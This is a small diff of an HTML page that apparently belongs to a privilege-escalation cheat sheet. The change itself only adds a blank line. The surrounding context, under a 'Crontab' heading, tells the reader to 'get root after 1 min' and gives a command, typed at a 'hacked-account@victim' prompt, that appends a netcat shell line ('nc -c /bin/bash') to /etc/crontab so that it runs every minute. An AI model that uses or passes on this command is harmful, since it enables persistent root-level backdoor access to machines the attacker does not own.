@@ -259,6 +259,7 @@ Run
 <h2>Crontab</h2>
 
 Add to crontab to get root after 1 min 
+
 <b>hacked-account@victim~: </b><code>echo ' *  *  *  *  * /usr/bin/nc -c /bin/bash' >> /etc/crontab</code>
 
 
